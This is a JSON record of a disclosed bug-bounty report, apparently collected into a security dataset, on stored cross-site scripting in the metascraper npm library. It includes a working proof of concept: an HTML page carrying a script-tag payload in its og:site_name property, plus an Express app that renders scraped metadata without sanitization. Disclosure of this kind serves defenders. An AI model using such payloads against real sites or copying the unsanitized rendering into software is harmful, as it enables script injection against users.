{
  "reported_to": "Node.js third-party modules",
  "reported_by": "bl4de ",
  "title": "[metascraper] Stored XSS in Open Graph meta properties read by metascrapper",
  "content": "\nHi Guys,\nmetascrapper is vulnerable to Stored XSS via Open Graph metadata, if they are used in HTML without any sanitization.\nModule:\nA library to easily scrape metadata from an article on the web using Open Graph metadata, regular HTML metadata, and series of fallbacks.\nhttps://www.npmjs.com/package/metascraper\nDescription\nDue to lack of HTML sanitization, there is possibility to embed malicious code in any of metadata read by metascrapper. When library reads such metadata, there is no sanitization performed. If output from metascrapper is used directly in HTML code, any HTML embed in metadata is executed in context of the page which load and render it.\nSteps To Reproduce:\nThis part of PoC represents An Attacker\nAn attacker needs to inject malicious code into any of Open Graph property.\ncreate website (I serve it via static server available at http://127.0.0.1:8080) witt the following content. Please take a look at payload embed in og:site_name meta property:\nCode 545 Bytes\n1<!doctype html>\n2<html xmlns:og=\"http://ogp.me/ns#\" lang=\"en\">\n3\n4<head>\n5    <meta charset=\"utf8\">\n6    <title>metascraper</title>\n7\n8    <meta property=\"og:description\" content=\"The HR startups go to war.\">\n9    <meta property=\"og:image\" content=\"image\">\n10    <meta property=\"og:site_name\" content='<script src=\"http://127.0.0.1:8080/malware.js\"></script>'>\n11    <meta property=\"og:title\" content=\"test article\">\n12    <meta property=\"og:type\" content=\"article\">\n13    <meta property=\"og:url\" content=\"http://127.0.0.1:8080\">\n14</head>\n15\n16<body>\n17</body>\n18</html>\nsave it as article.html in the root directory of the server runs on http://127.0.0.1:8080.\ncreate malware.js file with following content and save it in the same directory as article.html:\nCode 38 Bytes\n1alert('Uh oh, I am very bad malware!')\nPlease be aware that JavaScript file with malicious code can be served from ANY place. This particular location is only for Poc.\nThis represents an HTML page which can be \"scrapped\" with metascrapper\nThis part of PoC represents legitimate User and an attack itself\ninstall metascrapper and required dependiences (got and express)\nCode 38 Bytes\n1$ npm install metascrapper got express\ncreate an app which will use metascrapper to read webiste metadata. 127.0.0.1:8888 is address of server which uses metascrapper. http://127.0.0.1:8080/article.html is target website, where from metadata will be read:\nCode 1.25 KiB\n1\n2const metascraper = require('metascraper')\n3const got = require('got')\n4const express = require('express')\n5\n6const targetUrl = 'http://127.0.0.1:8080/article.html'\n7\n8const app = express()\n9\n10app.get('/scrap', function(req, res) {;\n11    (async() => {\n12        const {\n13            body: html,\n14            url\n15        } = await got(targetUrl)\n16        const metadata = await metascraper({\n17            html,\n18            url\n19        })\n20        console.log(metadata)  // see returned metadata in console:\n21        /*\n22            { author: null,\n23                date: null,\n24                description: 'The HR startups go to war.',\n25                image: 'http://127.0.0.1:8080/image',\n26                lang: 'en',\n27                logo: null,\n28                publisher: '<script src=\"http://127.0.0.1:8080/malware.js\"></script>',\n29                title: 'test article',\n30                url: 'http://127.0.0.1:8080/article.html' }\n31        */\n32        // display content of metadata.publisher in the browser\n33        let __html = `\n34            <div>\n35                <p>site title: ${metadata.title}</p>\n36                <p>site publisher: ${metadata.publisher}</p>\n37            </div>\n38        `\n39        res.send(__html)\n40    })()\n41})\n42\n43app.listen(8888, () => console.log('Example app listening on port 8888!'))\nrun above app:\nCode 13 Bytes\n1$ node app.js\ngo to http://127.0.0.1:8888/scrap\nmalicious JavaScript code embed in site metadata og:site_name is executed:\n<image_0>\nAs we can notice, our payload was displayed in the source page \"as is\":\n<image_1>\nSupporting Material/References:\nConfiguration I've used to find this vulnerability:\nmacOS HighSierra 10.13.3\nnode 8.9.3\nnpm 5.5.1\ncurl 7.54.0\nWrap up\nI hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.\nThank you\nRegards,\nRafal 'bl4de' Janicki\nImpact\nAlthough this is quite hard to exploit in the wild, there is no doubt such attack is possible. This might lead to malware distribution, session cookies from infected websites leaks, run cryptocurrency miners in users' browsers and many more attacks.\n\n",
  "severity": [
    9.6,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Cross-site Scripting (XSS) - Stored"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/257/373/68abc754876fe37cb8382a989ccf6199a46d5a30/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4GU2M7YZ%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T173821Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDIYlR0t7EfYRa%2B15XNsA53ckYJeOxtlQXx05Sey1hUnwIhAK1hz7%2BFGyKFtKE%2F8GyKgS1qUeYCvod4l%2BfchsetUEtWKrIFCDIQAxoMMDEzNjE5Mjc0ODQ5Igzw54GGSEptQf6v9hwqjwXLKs0RM7aKkbyjL8InLMdu4DjLXX%2FsAu%2BlcPBm6o20QLDrvTOdHlsIBYMWBWCD4Th6osOPXbCgiG9wETg3UoF14UDrntIEXzyS52tEshZe4ttzb72486vIifi0oI%2FHnsbYRaj%2BR9C8j3LDwvGxIvJxHHBdiowbIQ0L7Glkx1ynAN5qdcLcdArJF6xNnCqHxn0A%2FMk3%2Boas6oHfuwew%2BubfuyujCnvYyY%2B8NQu0C1kQ3f8nkUWiG93Zi6muAmw0Iuu0frm2yvE8EVCQelomPpWzyYVCCP%2FOM5L1dWnAuJUiyvr5%2FTNJHBmPQVBr6yDzOxhvI%2FqPlCuIJRaTZDlJUd%2BenQAORMTRBlQqAFO8HwtfkF0w8dxivIrc74Ojxk7XN44NxA3zKERD9nXScfoABueYkB3LGBSnRksv6nrCssnXVKsM02O0JmEgZXFbFWJGl6lU4RsVkeuLlTENssv42vIbYbSIc1wJ4%2FUO%2FPcIZjPT0vfNc2o2dYmjyKfdBCx6rlC9mMlutT7rTEYg5YP%2F0maqcpRqQ9CRW4s0%2BYEATnu7ZVv8elLswaNMUQ8j7Yit8J7BEOjAfUjW%2BiwI6AC5rUmwNa718MDun4lP5a5hIdY%2Fc%2FCb0HVBveL73I1YwdUMEiIm%2BJrBs8JApyUAgpLqoxMrnsCrTp8%2FevdxkYcn2%2B%2BEBQg5cxE%2FiZVxCwml4rml1NBhoOI%2FZ9w3ALIYwllGShwYSeFvPyWOgpD5dG8rWZJLePnxI7mE4v6hC2OjETx068oH8qzzxDYctKOs3xb35HmX7%2Fh2myFytO8dHDsYjO8OMj4KgP37DGKru1IZQ3olENpZ1Rp8iXA%2FYJPiRKOpy9YRMpxTk7qhx21S2P3mZsPFMPHVkL8GOrABUv4iH%2Ffl4RlBDus1tIDq5ZlbGnf3lGQqoQ7MBGmHjtvl7gik21VW0n%2Fxs1n1HJVnF3NcPVBGBoVrE71UVzDNo78N5o28t0S6XDcpKh3KNU9EVHizWRX9C51z2a7PY3E6JYR1hX78JXulsRXWGLRE%2FsBd55D1rVYVH9umyFOdLU0CFmZHj2ILQ06flW0cVITaEjyX%2FsacXW964kBteGEbu8cl3pI%2B4s6xXmmgfyjPf%2F4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6de0f0d04d74406d9252bffe8b185127db6e25257704d6d569a0df558c4c192f",
    "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/257/372/4c3e3add8dc7ad76e29e61191240a119fc0d3e17/2.png?response-content-disposition=attachment%3B%20filename%3D%222.png%22%3B%20filename%2A%3DUTF-8%27%272.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4GU2M7YZ%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T173821Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDIYlR0t7EfYRa%2B15XNsA53ckYJeOxtlQXx05Sey1hUnwIhAK1hz7%2BFGyKFtKE%2F8GyKgS1qUeYCvod4l%2BfchsetUEtWKrIFCDIQAxoMMDEzNjE5Mjc0ODQ5Igzw54GGSEptQf6v9hwqjwXLKs0RM7aKkbyjL8InLMdu4DjLXX%2FsAu%2BlcPBm6o20QLDrvTOdHlsIBYMWBWCD4Th6osOPXbCgiG9wETg3UoF14UDrntIEXzyS52tEshZe4ttzb72486vIifi0oI%2FHnsbYRaj%2BR9C8j3LDwvGxIvJxHHBdiowbIQ0L7Glkx1ynAN5qdcLcdArJF6xNnCqHxn0A%2FMk3%2Boas6oHfuwew%2BubfuyujCnvYyY%2B8NQu0C1kQ3f8nkUWiG93Zi6muAmw0Iuu0frm2yvE8EVCQelomPpWzyYVCCP%2FOM5L1dWnAuJUiyvr5%2FTNJHBmPQVBr6yDzOxhvI%2FqPlCuIJRaTZDlJUd%2BenQAORMTRBlQqAFO8HwtfkF0w8dxivIrc74Ojxk7XN44NxA3zKERD9nXScfoABueYkB3LGBSnRksv6nrCssnXVKsM02O0JmEgZXFbFWJGl6lU4RsVkeuLlTENssv42vIbYbSIc1wJ4%2FUO%2FPcIZjPT0vfNc2o2dYmjyKfdBCx6rlC9mMlutT7rTEYg5YP%2F0maqcpRqQ9CRW4s0%2BYEATnu7ZVv8elLswaNMUQ8j7Yit8J7BEOjAfUjW%2BiwI6AC5rUmwNa718MDun4lP5a5hIdY%2Fc%2FCb0HVBveL73I1YwdUMEiIm%2BJrBs8JApyUAgpLqoxMrnsCrTp8%2FevdxkYcn2%2B%2BEBQg5cxE%2FiZVxCwml4rml1NBhoOI%2FZ9w3ALIYwllGShwYSeFvPyWOgpD5dG8rWZJLePnxI7mE4v6hC2OjETx068oH8qzzxDYctKOs3xb35HmX7%2Fh2myFytO8dHDsYjO8OMj4KgP37DGKru1IZQ3olENpZ1Rp8iXA%2FYJPiRKOpy9YRMpxTk7qhx21S2P3mZsPFMPHVkL8GOrABUv4iH%2Ffl4RlBDus1tIDq5ZlbGnf3lGQqoQ7MBGmHjtvl7gik21VW0n%2Fxs1n1HJVnF3NcPVBGBoVrE71UVzDNo78N5o28t0S6XDcpKh3KNU9EVHizWRX9C51z2a7PY3E6JYR1hX78JXulsRXWGLRE%2FsBd55D1rVYVH9umyFOdLU0CFmZHj2ILQ06flW0cVITaEjyX%2FsacXW964kBteGEbu8cl3pI%2B4s6xXmmgfyjPf%2F4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bb8e81fb83da9f4f4db3d616a202632d847a47a6610f88e08d0fbfa88251e8a6"
  },
  "disclosed_date": 1522231740,
  "report_url": "https://hackerone.com/reports/309367",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Create a malicious HTML file with XSS payload in Open Graph metadata (og:site_name)"
    ],
    [
      2,
      "Set up a server to serve the malicious HTML file and a JavaScript payload"
    ],
    [
      3,
      "Create a Node.js application using metascraper to scrape the malicious site"
    ],
    [
      4,
      "Visit the Node.js application's endpoint to trigger the XSS execution"
    ]
  ],
  "vuln_description": "The metascraper library is vulnerable to Stored XSS via Open Graph metadata due to lack of HTML sanitization. When metadata containing malicious scripts is scraped and rendered directly in HTML, the scripts execute in the context of the page displaying them.",
  "reason": "The vulnerability involves understanding Open Graph metadata, how metascraper processes it, and how unsanitized output can lead to XSS. While the components are straightforward (HTML metadata, scraping library, and output rendering), the interaction between them is somewhat subtle in that the vulnerability arises from the library's failure to sanitize rather than any complex application logic.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "authnz_metadata": {
    "reason": "The vulnerability described involves a stored XSS via Open Graph metadata, which is a client-side injection issue rather than an authentication or authorization bypass. The proposed methodologies focus on testing AuthN/AuthZ boundaries by swapping user sessions and resource IDs, which does not apply to XSS vulnerabilities that arise from unsanitized metadata rendering.",
    "is_detectable": false
  },
  "injection_metadata": {
    "reasoning": "The vulnerability involves injecting XSS payloads into Open Graph metadata parameters (like og:site_name) which are stored and reflected unsanitized. The methodology would detect this because:\n1. The og:site_name parameter would be identified as injectable during response analysis (methodology step 3)\n2. A basic <script> payload (as used in PoC) qualifies as a 'simple payload' per the testing criteria\n3. Execution verification occurs through regular navigation to the scraper endpoint (same channel)\n4. No custom filter bypasses were required in the PoC payload\n5. The trigger occurs through normal user interaction with the vulnerable application",
    "is_simple_injection": true
  }
}